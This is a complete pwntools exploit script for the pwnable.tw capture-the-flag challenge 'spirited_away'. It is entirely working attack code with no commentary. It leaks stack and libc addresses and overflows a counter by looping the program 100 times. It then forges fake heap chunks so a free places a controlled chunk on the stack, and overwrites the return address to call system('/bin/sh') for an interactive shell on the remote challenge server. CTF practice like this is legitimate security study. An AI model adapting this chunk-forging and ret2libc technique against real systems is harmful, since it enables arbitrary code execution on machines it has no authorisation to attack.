#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./spirited_away")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./spirited_away")
    libc = elf.libc
    oneGadget = 0x5f7a5


else:
    io = remote("chall.pwnable.tw", 10204)
    libc = ELF("./libc_32.so.6")
    oneGadget = 0x5f065


def DEBUG(cmd = "\n"):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    io.sendafter("name: ", "M4x")
    io.sendlineafter("age: ", str(0x21212121))
    DEBUG("b *0x804878a\nc")
    io.sendafter("movie? ", '0' * 0x50)
    io.sendafter("comment: ", 'c' * 0x3c)
    survryEbp = u32(io.recvuntil("\xff")[-4: ])
    success("survryEbp -> {:#x}".format(survryEbp))
    libcBase = u32(io.recvuntil("\xf7")[-4: ]) - libc.sym['_IO_2_1_stdout_']
    success("libcBase -> {:#x}".format(libcBase))
    pause()

    force = log.progress("cnt: ")
    for i in xrange(100):
        context.log_level = "info"
        io.sendafter("<y/n>: ", "y")
        #  io.send("y")
        io.sendafter("name: ", '0' * 0x3c)
        #  io.send('0' * 0x3c)
        io.sendlineafter("age: ", str(0x21212121))
        #  io.send(str(0x21212121))
        io.sendafter("movie? ", '1' * 0x50)
        #  io.send('1' * 0x50)
        io.sendafter("comment: ", '2' * 0x3c)
        #  io.send('2' * 0x3c)
        force.status("{}".format(i))
    
    io.sendafter("<y/n>: ", "y")
    io.sendafter("name: ", "n" * 0x3c)
    io.sendlineafter("age: ", str(0x21212121))

    reason = p32(0) + p32(0x41) + 'r' * 56 + p32(0) + p32(0x41)
    io.sendafter("movie? ", reason)

    comment = 'c' * 0x50 + '2121' + p32(survryEbp - 0x68) + p32(0) + p32(0x41)
    io.sendafter("comment: ", comment)

    #  DEBUG("b *0x80488C9\nc")
    io.sendafter("<y/n>: ", "y")
    payload = 'a' * (0x48 + 4) + p32(libcBase + libc.sym['system']) + 'aaaa' + p32( libcBase + next(libc.search("/bin/sh")))
    io.sendafter("name: ", payload)
    io.sendlineafter("age: ", str(0))
    io.sendafter("movie? ", "hos")
    io.sendafter("comment: ", "hos")

    io.sendafter("<y/n>: ", "n")

    io.interactive()
    io.close()



